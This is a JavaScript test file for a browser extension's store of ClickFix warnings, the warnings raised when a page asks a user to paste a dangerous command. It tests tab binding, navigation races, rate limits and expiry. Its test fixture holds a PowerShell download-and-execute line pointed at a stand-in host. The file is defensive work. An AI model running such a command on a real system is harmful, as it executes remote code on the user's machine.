import test from "node:test";
import assert from "node:assert/strict";

import {
  CLICKFIX_WARNING_MAX_ACTIVE,
  CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB,
  CLICKFIX_WARNING_OPEN_RATE_LIMIT,
  CLICKFIX_WARNING_OPEN_RATE_WINDOW_MS,
  CLICKFIX_WARNING_STAGING_URL,
  CLICKFIX_WARNING_STATE_KEY,
  CLICKFIX_WARNING_TTL_MS,
  createClickfixWarningStore,
} from "./clickfixWarnings.mjs";

function memoryStorage(initial = {}) {
  let data = structuredClone(initial);
  return {
    async get(keys) {
      // Yield once so concurrent unqueued read-modify-write operations would
      // both be able to observe the same stale snapshot.
      await Promise.resolve();
      const requested = Array.isArray(keys) ? keys : [keys];
      const result = {};
      for (const key of requested) {
        if (Object.hasOwn(data, key)) result[key] = structuredClone(data[key]);
      }
      return result;
    },
    async set(values) {
      await Promise.resolve();
      data = { ...data, ...structuredClone(values) };
    },
    dump() {
      return structuredClone(data);
    },
  };
}

function idSource(...ids) {
  let index = 0;
  return {
    randomUUID() {
      const id = ids[index];
      index += 1;
      if (id === undefined) throw new Error("test id source exhausted");
      return id;
    },
  };
}

// Every navigable record is created already bound to the tab that will display
// it (issue #29), so the warning tab is part of the creation input rather than
// something a later binding step supplies.
function warning(overrides = {}) {
  return {
    warningTabId: 20,
    stagingDocumentId: "staging-document",
    sourceTabId: 10,
    sourceFrameId: 0,
    sourceDocumentId: "document-a",
    sourceUrl: "https://source.test/instructions",
    mode: "warn",
    decision: {
      action: "warn",
      reasons: ["system tool", "download behavior"],
    },
    text: "powershell iwr https://payload.test/a.ps1 | iex",
    ...overrides,
  };
}

function storedWarning(requestId, overrides = {}) {
  return {
    requestId,
    ...warning(overrides),
    status: "staging",
    createdAt: 1,
    expiresAt: 1_000,
  };
}

const INTERSTITIAL = (requestId) =>
  `chrome-extension://abc/interstitial/clickfix.html?kind=clickfix&request=${requestId}`;

test("createBoundWarning stores a short-lived, tab-bound, immutable record", async () => {
  const storageArea = memoryStorage();
  const input = warning();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 1_000,
    ttlMs: 500,
    cryptoApi: idSource("request-a"),
  });

  const created = await store.createBoundWarning(input);

  assert.deepEqual(created, {
    requestId: "request-a",
    ...input,
    status: "staging",
    createdAt: 1_000,
    expiresAt: 1_500,
  });
  assert.equal(created.warningTabId, 20, "the record is navigable the moment it exists");
  assert.equal(Object.isFrozen(created), true);
  assert.equal(Object.isFrozen(created.decision), true);
  assert.equal(Object.isFrozen(created.decision.reasons), true);

  // Neither the caller's input nor the returned snapshot can mutate storage.
  input.decision.reasons.push("changed after create");
  assert.throws(() => created.decision.reasons.push("changed after return"), TypeError);

  const reread = await store.getWarning("request-a", 20);
  assert.deepEqual(reread.decision.reasons, ["system tool", "download behavior"]);
  assert.notStrictEqual(reread, created);
  assert.notStrictEqual(reread.decision, created.decision);

  const persisted = storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id["request-a"];
  assert.equal(persisted.warningTabId, 20);
  assert.equal(persisted.status, "staging");
  assert.deepEqual(persisted.decision.reasons, ["system tool", "download behavior"]);
});

test("a warning cannot be created without a usable, distinct warning tab", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });

  for (const invalid of [undefined, null, -1, 1.5, "20", Number.NaN]) {
    const input = warning();
    if (invalid === undefined) delete input.warningTabId;
    else input.warningTabId = invalid;
    await assert.rejects(store.createBoundWarning(input), /warningTabId/);
  }
  // Binding a warning to the very page that asked for it would put the verdict
  // in the tab it is supposed to protect.
  await assert.rejects(
    store.createBoundWarning(warning({ warningTabId: 10, sourceTabId: 10 })),
    /warningTabId must not be the source tab/
  );

  // No partial state survived any of the rejections.
  assert.notEqual(await store.createBoundWarning(warning()), null);
});

test("a warning is readable and consumable only by the exact tab and request it was bound to", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("request-a", "request-b"),
  });
  await store.createBoundWarning(warning({ warningTabId: 40 }));
  await store.createBoundWarning(warning({ warningTabId: 41, sourceTabId: 11 }));

  assert.equal((await store.getWarning("request-a", 40)).requestId, "request-a");
  assert.equal(await store.getWarning("request-a", 41), null, "another tab cannot retrieve it");
  assert.equal(await store.getWarning("request-b", 40), null, "another request cannot claim it");
  assert.equal(await store.consumeWarning("request-a", 41), null, "another tab cannot consume it");
  assert.equal(await store.consumeWarning("request-b", 40), null);

  const [first, second] = await Promise.all([
    store.consumeWarning("request-a", 40),
    store.consumeWarning("request-a", 40),
  ]);
  assert.equal(first?.requestId, "request-a");
  assert.equal(second, null, "approval and cancellation are single-use");
  assert.equal(await store.getWarning("request-a", 40), null);
  assert.deepEqual(
    Object.keys(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id),
    ["request-b"]
  );
});

// =============================================================================
// WARNING-TAB NAVIGATION RECONCILIATION (issue #29)
//
// One atomic decision per navigation, replacing the getWarning()-then-
// discardWarningTab() pair whose gap could delete a freshly bound record.
// =============================================================================

test("expected staging navigation keeps a record nothing has displayed yet", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });
  await store.createBoundWarning(warning({ warningTabId: 40 }));

  const reconciled = await store.reconcileWarningTabNavigation({
    warningTabId: 40,
    requestId: null,
    url: CLICKFIX_WARNING_STAGING_URL,
  });

  assert.equal(reconciled.outcome, "staging");
  assert.equal(reconciled.warning.status, "staging");
  assert.equal((await store.getWarning("request-a", 40)).requestId, "request-a");

  // An event that carries no address says nothing about where the tab went.
  assert.equal(
    (await store.reconcileWarningTabNavigation({ warningTabId: 40, requestId: null })).outcome,
    "staging"
  );
  assert.notEqual(await store.getWarning("request-a", 40), null);
});

test("only the exact matching interstitial commit marks the record active", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });
  await store.createBoundWarning(warning({ warningTabId: 40 }));
  await store.beginWarningTabNavigation("request-a", 40);

  const updated = await store.reconcileWarningTabNavigation({
    warningTabId: 40,
    requestId: "request-a",
    url: INTERSTITIAL("request-a"),
    phase: "updated",
  });
  assert.equal(updated.outcome, "navigating");
  assert.equal((await store.getWarning("request-a", 40)).status, "navigating");

  const committed = await store.reconcileWarningTabNavigation({
    warningTabId: 40,
    requestId: "request-a",
    url: INTERSTITIAL("request-a"),
    phase: "committed",
    documentId: "interstitial-document",
  });
  assert.equal(committed.outcome, "activated");
  assert.equal(committed.warning.status, "active");
  assert.equal(
    storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id["request-a"].status,
    "active"
  );

  assert.equal(
    (await store.reconcileWarningTabNavigation({
      warningTabId: 40,
      requestId: "request-a",
      url: INTERSTITIAL("request-a"),
      phase: "committed",
      documentId: "interstitial-document",
    })).outcome,
    "activated"
  );
  // A late URL-only event for the original staging address is advisory.
  assert.equal(
    (await store.reconcileWarningTabNavigation({
      warningTabId: 40, requestId: null, url: CLICKFIX_WARNING_STAGING_URL,
    })).outcome,
    "staging"
  );
  assert.equal((await store.getWarning("request-a", 40)).status, "active");
});

test("a committed return to about:blank cannot reuse an active warning authorization", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });
  await store.createBoundWarning(warning({ warningTabId: 40 }));
  await store.beginWarningTabNavigation("request-a", 40);
  await store.reconcileWarningTabNavigation({
    warningTabId: 40,
    requestId: "request-a",
    url: INTERSTITIAL("request-a"),
    phase: "committed",
    documentId: "interstitial-document",
  });

  const backToBlank = await store.reconcileWarningTabNavigation({
    warningTabId: 40,
    requestId: null,
    url: CLICKFIX_WARNING_STAGING_URL,
    phase: "committed",
    // Chrome may restore the original staging document from history. Active
    // state must still be discarded rather than authorized for Forward.
    documentId: "staging-document",
  });

  assert.equal(backToBlank.outcome, "discarded");
  assert.equal(await store.getWarning("request-a", 40), null);
});

test("the original staging commit is retained by document identity", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });
  await store.createBoundWarning(warning({ warningTabId: 40 }));

  const stagingCommit = await store.reconcileWarningTabNavigation({
    warningTabId: 40,
    requestId: null,
    url: CLICKFIX_WARNING_STAGING_URL,
    phase: "committed",
    documentId: "staging-document",
  });

  assert.equal(stagingCommit.outcome, "staging");
  assert.notEqual(await store.getWarning("request-a", 40), null);
});

test("unrelated warning-tab navigation and a mismatched request id both discard the record", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("request-a", "request-b", "request-c"),
  });

  await store.createBoundWarning(warning({ warningTabId: 40 }));
  const unrelated = await store.reconcileWarningTabNavigation({
    warningTabId: 40,
    requestId: null,
    url: "https://attacker.test/",
  });
  assert.equal(unrelated.outcome, "discarded");
  assert.equal(await store.getWarning("request-a", 40), null);

  // A stale or hand-edited warning address cannot claim a different record.
  await store.createBoundWarning(warning({ warningTabId: 41, sourceTabId: 11 }));
  const mismatched = await store.reconcileWarningTabNavigation({
    warningTabId: 41,
    requestId: "request-c",
    url: INTERSTITIAL("request-c"),
  });
  assert.equal(mismatched.outcome, "discarded");
  assert.equal(await store.getWarning("request-b", 41), null);

  // A tab holding no warning at all is simply not this store's business.
  assert.deepEqual(
    await store.reconcileWarningTabNavigation({
      warningTabId: 99, requestId: null, url: "https://attacker.test/",
    }),
    { outcome: "none", warning: null }
  );
});

test("reconciliation is atomic: exactly one caller observes and removes the record", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("request-a", "request-b"),
  });
  await store.createBoundWarning(warning({ warningTabId: 40 }));

  const [left, right] = await Promise.all([
    store.reconcileWarningTabNavigation({ warningTabId: 40, requestId: null, url: "https://a.test/" }),
    store.reconcileWarningTabNavigation({ warningTabId: 40, requestId: null, url: "https://b.test/" }),
  ]);
  assert.deepEqual(
    [left.outcome, right.outcome].sort(),
    ["discarded", "none"],
    "a double navigation cannot report two removals of one record"
  );

  // Reconciliation and consumption race for the same record; exactly one wins.
  await store.createBoundWarning(warning({ warningTabId: 41, sourceTabId: 11 }));
  const [reconciled, consumed] = await Promise.all([
    store.reconcileWarningTabNavigation({ warningTabId: 41, requestId: null, url: "https://a.test/" }),
    store.consumeWarning("request-b", 41),
  ]);
  assert.equal(reconciled.outcome, "discarded");
  assert.equal(consumed, null);
  assert.deepEqual(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id, {});
});

// The exact cold-start race from issue #29: navigation cleanup for the warning
// tab and creation of that tab's warning arrive together. Under the old
// check-then-bind lifecycle, cleanup could observe "no warning for this tab"
// and then delete the record bound in between.
test("concurrent cleanup cannot delete a matching newly created warning", async () => {
  for (const cleanupFirst of [true, false]) {
    const store = createClickfixWarningStore(memoryStorage(), {
      now: () => 10,
      cryptoApi: idSource("request-a"),
    });
    const cleanup = () => store.reconcileWarningTabNavigation({
      warningTabId: 40,
      requestId: null,
      url: CLICKFIX_WARNING_STAGING_URL,
    });
    const create = () => store.createBoundWarning(warning({ warningTabId: 40 }));

    const [created, reconciled] = cleanupFirst
      ? await Promise.all([cleanup(), create()]).then(([a, b]) => [b, a])
      : await Promise.all([create(), cleanup()]);

    assert.equal(created?.requestId, "request-a");
    assert.equal(reconciled.outcome, cleanupFirst ? "none" : "staging");
    assert.equal(
      (await store.getWarning("request-a", 40)).requestId,
      "request-a",
      `the record survives cleanup arriving ${cleanupFirst ? "before" : "after"} creation`
    );
  }
});

test("abandonWarningTab atomically takes the record so its source tab can be restored", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });
  await store.createBoundWarning(warning({ warningTabId: 40, sourceTabId: 7 }));

  const [first, second] = await Promise.all([
    store.abandonWarningTab(40),
    store.abandonWarningTab(40),
  ]);
  assert.equal(first?.sourceTabId, 7);
  assert.equal(second, null);
  assert.deepEqual(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id, {});
  assert.equal(await store.abandonWarningTab(41), null);
});

test("a recycled warning-tab id cannot leave two records claiming one tab", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("stale", "fresh"),
  });
  await store.createBoundWarning(warning({ warningTabId: 40, sourceTabId: 1 }));
  await store.createBoundWarning(warning({ warningTabId: 40, sourceTabId: 2 }));

  assert.equal(await store.getWarning("stale", 40), null, "the closed tab's record is evicted");
  assert.equal((await store.getWarning("fresh", 40)).sourceTabId, 2);
  assert.deepEqual(
    Object.keys(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id),
    ["fresh"]
  );

  // Corrupted state claiming the same tab twice is normalized back to one.
  const duplicated = memoryStorage({
    [CLICKFIX_WARNING_STATE_KEY]: {
      warnings_by_id: {
        one: storedWarning("one", { warningTabId: 40, sourceTabId: 1 }),
        two: storedWarning("two", { warningTabId: 40, sourceTabId: 2 }),
      },
      warning_open_timestamps_by_source_tab: {},
    },
  });
  const reloaded = createClickfixWarningStore(duplicated, {
    now: () => 10,
    cryptoApi: idSource("unused"),
  });
  assert.equal(await reloaded.pruneExpired(), 1);
  assert.deepEqual(
    Object.keys(duplicated.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id),
    ["one"]
  );
});

// =============================================================================
// SOURCE-DOCUMENT LIFETIME (issue #29)
// =============================================================================

test("a replaced source document invalidates its warnings, a same-document change does not", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });
  await store.createBoundWarning(warning({ warningTabId: 40, sourceDocumentId: "document-a" }));

  // History API and fragment navigation keep the exact document alive. GitHub
  // and other SPAs run late pushState()/replaceState() calls while the user is
  // still reading the warning; the immutable request must survive them.
  for (let index = 0; index < 3; index += 1) {
    assert.equal(await store.discardSourceDocument(10, 0, "document-a"), 0);
    assert.equal((await store.getWarning("request-a", 40)).requestId, "request-a");
  }

  // A real document replacement commits a different document id.
  assert.equal(await store.discardSourceDocument(10, 0, "document-b"), 1);
  assert.equal(await store.getWarning("request-a", 40), null);
});

test("discardSourceDocument removes replaced-document warnings for only the matching frame", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("old", "current", "other-frame", "other-tab"),
  });

  await store.createBoundWarning(warning({ warningTabId: 20, sourceDocumentId: "old-document" }));
  await store.createBoundWarning(warning({ warningTabId: 21, sourceDocumentId: "current-document" }));
  await store.createBoundWarning(
    warning({ warningTabId: 22, sourceFrameId: 1, sourceDocumentId: "frame-document" })
  );
  await store.createBoundWarning(
    warning({ warningTabId: 23, sourceTabId: 11, sourceDocumentId: "other-document" })
  );

  assert.equal(await store.discardSourceDocument(10, 0, "current-document"), 1);
  assert.equal(await store.getWarning("old", 20), null);
  assert.equal((await store.getWarning("current", 21)).sourceDocumentId, "current-document");
  assert.equal((await store.getWarning("other-frame", 22)).sourceFrameId, 1);
  assert.equal((await store.getWarning("other-tab", 23)).sourceTabId, 11);

  assert.equal(await store.discardSourceDocument(10, 0), 1);
  assert.equal(await store.getWarning("current", 21), null);
  assert.equal((await store.getWarning("other-frame", 22)).sourceFrameId, 1);
});

// =============================================================================
// CAPS, RATE LIMITING, AND DURABILITY
// =============================================================================

test("canCreateWarning reports the same admission decision createBoundWarning enforces", async () => {
  let clock = 0;
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => clock,
    cryptoApi: idSource("request-a", "request-b", "request-c"),
  });

  for (let index = 0; index < CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB; index += 1) {
    assert.equal(await store.canCreateWarning(10), true);
    assert.notEqual(await store.createBoundWarning(warning({ warningTabId: 100 + index })), null);
    clock += CLICKFIX_WARNING_OPEN_RATE_WINDOW_MS + 1;
  }

  assert.equal(await store.canCreateWarning(10), false, "the probe refuses before a tab is opened");
  assert.equal(await store.createBoundWarning(warning({ warningTabId: 200 })), null);
  assert.equal(await store.canCreateWarning(11), true, "another source tab is unaffected");
});

test("FIFO serialization prevents concurrent creates from losing an entry", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("request-a", "request-b"),
  });

  const [first, second] = await Promise.all([
    store.createBoundWarning(warning({ warningTabId: 20, sourceTabId: 1 })),
    store.createBoundWarning(warning({ warningTabId: 21, sourceTabId: 2 })),
  ]);

  assert.deepEqual([first.requestId, second.requestId], ["request-a", "request-b"]);
  assert.deepEqual(
    Object.keys(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id),
    ["request-a", "request-b"]
  );
});

test("createBoundWarning atomically enforces the global active-warning cap", async () => {
  const ids = Array.from({ length: CLICKFIX_WARNING_MAX_ACTIVE }, (_, index) => `request-${index}`);
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource(...ids),
  });

  const results = await Promise.all(
    Array.from({ length: CLICKFIX_WARNING_MAX_ACTIVE + 1 }, (_, index) =>
      store.createBoundWarning(warning({ warningTabId: 1_000 + index, sourceTabId: index + 1 })))
  );

  assert.equal(results.filter((result) => result !== null).length, CLICKFIX_WARNING_MAX_ACTIVE);
  assert.equal(results.at(-1), null);
  assert.equal(
    Object.keys(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id).length,
    CLICKFIX_WARNING_MAX_ACTIVE
  );
});

test("createBoundWarning enforces the per-source active cap independently of the rate window", async () => {
  let clock = 0;
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => clock,
    cryptoApi: idSource("request-a", "request-b", "request-c"),
  });

  for (let index = 0; index < CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB; index += 1) {
    assert.notEqual(await store.createBoundWarning(warning({ warningTabId: 100 + index })), null);
    clock += CLICKFIX_WARNING_OPEN_RATE_WINDOW_MS + 1;
  }
  assert.equal(await store.createBoundWarning(warning({ warningTabId: 200 })), null);
});

test("warning-open rate limit survives service-worker store reconstruction", async () => {
  let clock = 1_000;
  const storageArea = memoryStorage();
  const firstWorkerStore = createClickfixWarningStore(storageArea, {
    now: () => clock,
    cryptoApi: idSource("request-a", "request-b", "request-c"),
  });

  for (let index = 0; index < CLICKFIX_WARNING_OPEN_RATE_LIMIT; index += 1) {
    const created = await firstWorkerStore.createBoundWarning(warning({ warningTabId: 100 + index }));
    assert.notEqual(created, null);
    assert.equal(await firstWorkerStore.discardWarning(created.requestId), true);
  }

  const restartedWorkerStore = createClickfixWarningStore(storageArea, {
    now: () => clock,
    cryptoApi: idSource("request-d"),
  });
  assert.equal(await restartedWorkerStore.createBoundWarning(warning()), null);

  clock += CLICKFIX_WARNING_OPEN_RATE_WINDOW_MS;
  assert.equal((await restartedWorkerStore.createBoundWarning(warning())).requestId, "request-d");
});

test("persisted warning-open timestamps are pruned, ordered, and bounded on every operation", async () => {
  const storageArea = memoryStorage({
    [CLICKFIX_WARNING_STATE_KEY]: {
      warnings_by_id: {},
      warning_open_timestamps_by_source_tab: {
        "01": [19_999],
        "10": [0, 15_003, 15_001, 15_002, 15_000, 25_000, "invalid"],
        "11": [],
      },
    },
  });
  const store = createClickfixWarningStore(storageArea, {
    now: () => 20_000,
    cryptoApi: idSource("unused"),
  });

  assert.equal(await store.nextExpiry(), null);
  assert.deepEqual(
    storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warning_open_timestamps_by_source_tab,
    { "10": [15_001, 15_002, 15_003] }
  );
});

test("persisted active warnings are normalized back to global and per-source caps", async () => {
  const globallyOverCap = Object.fromEntries(
    Array.from({ length: CLICKFIX_WARNING_MAX_ACTIVE + 1 }, (_, index) => {
      const requestId = `global-${index}`;
      return [requestId, storedWarning(requestId, {
        warningTabId: 1_000 + index,
        sourceTabId: index + 1,
      })];
    })
  );
  const globalStorage = memoryStorage({
    [CLICKFIX_WARNING_STATE_KEY]: {
      warnings_by_id: globallyOverCap,
      warning_open_timestamps_by_source_tab: {},
    },
  });
  const globalStore = createClickfixWarningStore(globalStorage, {
    now: () => 10,
    cryptoApi: idSource("unused-global"),
  });

  assert.equal(await globalStore.pruneExpired(), 1);
  assert.equal(
    Object.keys(globalStorage.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id).length,
    CLICKFIX_WARNING_MAX_ACTIVE
  );

  const perSourceWarnings = Object.fromEntries(
    Array.from({ length: CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB + 1 }, (_, index) => {
      const requestId = `source-${index}`;
      return [requestId, storedWarning(requestId, { warningTabId: 1_000 + index })];
    })
  );
  const sourceStorage = memoryStorage({
    [CLICKFIX_WARNING_STATE_KEY]: {
      warnings_by_id: perSourceWarnings,
      warning_open_timestamps_by_source_tab: {},
    },
  });
  const sourceStore = createClickfixWarningStore(sourceStorage, {
    now: () => 10,
    cryptoApi: idSource("unused-source"),
  });

  assert.equal(await sourceStore.pruneExpired(), 1);
  assert.equal(
    Object.keys(sourceStorage.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id).length,
    CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB
  );
});

test("expired, unbound, and malformed records are pruned on every operation", async () => {
  let clock = 100;
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => clock,
    ttlMs: 50,
    cryptoApi: idSource("request-a"),
  });
  await store.createBoundWarning(warning());

  clock = 150;
  assert.equal(await store.getWarning("request-a", 20), null);
  assert.deepEqual(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id, {});

  // A record with no warning tab, or an unknown status, is not a lifecycle this
  // store can produce any more (issue #29): it is stale or corrupt state.
  const rejected = {
    malformed: { requestId: "malformed", expiresAt: 999_999 },
    unbound: { ...storedWarning("unbound"), warningTabId: null },
    "unknown-status": { ...storedWarning("unknown-status"), warningTabId: 21, status: "shown" },
    "self-bound": { ...storedWarning("self-bound"), warningTabId: 10 },
  };
  const malformedStorage = memoryStorage({
    [CLICKFIX_WARNING_STATE_KEY]: { warnings_by_id: rejected },
  });
  const malformedStore = createClickfixWarningStore(malformedStorage, {
    now: () => 1,
    cryptoApi: idSource("request-b"),
  });
  assert.equal(await malformedStore.pruneExpired(), Object.keys(rejected).length);
  assert.deepEqual(malformedStorage.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id, {});
});

test("pruneExpired reports and removes all records whose TTL elapsed", async () => {
  let clock = 0;
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => clock,
    ttlMs: 100,
    cryptoApi: idSource("request-a", "request-b"),
  });
  await store.createBoundWarning(warning({ warningTabId: 20, sourceTabId: 1 }));
  clock = 50;
  await store.createBoundWarning(warning({ warningTabId: 30, sourceTabId: 2 }));
  clock = 100;

  assert.equal(await store.pruneExpired(), 1);
  assert.equal((await store.getWarning("request-b", 30)).sourceTabId, 2);
});

test("discardTab removes warnings involving either the source or warning tab", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("source-match", "warning-match", "unrelated"),
  });

  await store.createBoundWarning(warning({ warningTabId: 11, sourceTabId: 1 }));
  await store.createBoundWarning(warning({ warningTabId: 1, sourceTabId: 2 }));
  await store.createBoundWarning(warning({ warningTabId: 13, sourceTabId: 3 }));

  assert.equal(await store.discardTab(1), 2);
  assert.equal(await store.getWarning("source-match", 11), null);
  assert.equal(await store.getWarning("warning-match", 1), null);
  assert.equal((await store.getWarning("unrelated", 13)).sourceTabId, 3);
});

test("discardWarningTab removes only records bound to the closed warning UI tab", async () => {
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => 10,
    cryptoApi: idSource("source-id-match", "warning-id-match"),
  });
  await store.createBoundWarning(warning({ warningTabId: 51, sourceTabId: 50 }));
  await store.createBoundWarning(warning({ warningTabId: 50, sourceTabId: 2 }));

  assert.equal(await store.discardWarningTab(50), 1);
  assert.equal(await store.getWarning("warning-id-match", 50), null);
  assert.equal((await store.getWarning("source-id-match", 51)).sourceTabId, 50);
});

test("nextExpiry returns the earliest unexpired warning and null after pruning", async () => {
  let clock = 0;
  const store = createClickfixWarningStore(memoryStorage(), {
    now: () => clock,
    ttlMs: 100,
    cryptoApi: idSource("request-a", "request-b"),
  });
  await store.createBoundWarning(warning({ warningTabId: 20, sourceTabId: 1 }));
  clock = 25;
  await store.createBoundWarning(warning({ warningTabId: 21, sourceTabId: 2 }));

  assert.equal(await store.nextExpiry(), 100);
  clock = 100;
  assert.equal(await store.nextExpiry(), 125);
  clock = 125;
  assert.equal(await store.nextExpiry(), null);
});

test("discardWarning withdraws a warning whose interstitial setup failed", async () => {
  const storageArea = memoryStorage();
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: idSource("request-a"),
  });
  await store.createBoundWarning(warning());

  assert.equal(await store.discardWarning("request-a"), true);
  assert.equal(await store.discardWarning("request-a"), false);
  assert.deepEqual(storageArea.dump()[CLICKFIX_WARNING_STATE_KEY].warnings_by_id, {});
});

test("invalid input is rejected and a failed queued task does not poison later tasks", async () => {
  const storageArea = memoryStorage();
  let idAttempt = 0;
  const store = createClickfixWarningStore(storageArea, {
    now: () => 10,
    cryptoApi: {
      randomUUID() {
        idAttempt += 1;
        return idAttempt === 1 ? "" : "request-a";
      },
    },
  });

  await assert.rejects(store.createBoundWarning(warning({ sourceFrameId: -1 })), /sourceFrameId/);
  await assert.rejects(store.createBoundWarning(warning()), /invalid id/);
  const created = await store.createBoundWarning(warning());
  assert.equal(created.requestId, "request-a");
  await assert.rejects(store.createBoundWarning(warning({ decision: new Date() })), /plain objects/);
  await assert.rejects(store.reconcileWarningTabNavigation(null), /navigation must be an object/);
  await assert.rejects(
    store.reconcileWarningTabNavigation({ warningTabId: 20, url: 42 }),
    /url must be a string/
  );
});

test("default TTL is short-lived and exported for service-worker integration", () => {
  assert.equal(CLICKFIX_WARNING_TTL_MS, 300_000);
  assert.equal(CLICKFIX_WARNING_MAX_ACTIVE, 32);
  assert.equal(CLICKFIX_WARNING_MAX_ACTIVE_PER_SOURCE_TAB, 3);
  assert.equal(CLICKFIX_WARNING_OPEN_RATE_LIMIT, 3);
  assert.equal(CLICKFIX_WARNING_OPEN_RATE_WINDOW_MS, 10_000);
  // The staging address is shared with the worker so the tab it opens is
  // exactly the address this store recognizes as expected staging navigation.
  assert.equal(CLICKFIX_WARNING_STAGING_URL, "about:blank");
});

// No API remains that could produce, bind, or navigate an unbound record.
test("the store exposes no unbound creation or late binding path", () => {
  const store = createClickfixWarningStore(memoryStorage(), { cryptoApi: idSource("unused") });
  assert.equal(store.createWarning, undefined);
  assert.equal(store.bindWarningTab, undefined);
  assert.deepEqual(Object.keys(store).sort(), [
    "abandonWarningTab",
    "beginWarningTabNavigation",
    "canCreateWarning",
    "consumeWarning",
    "createBoundWarning",
    "discardSourceDocument",
    "discardTab",
    "discardWarning",
    "discardWarningTab",
    "getWarning",
    "nextExpiry",
    "pruneExpired",
    "reconcileWarningTabNavigation",
  ]);
});
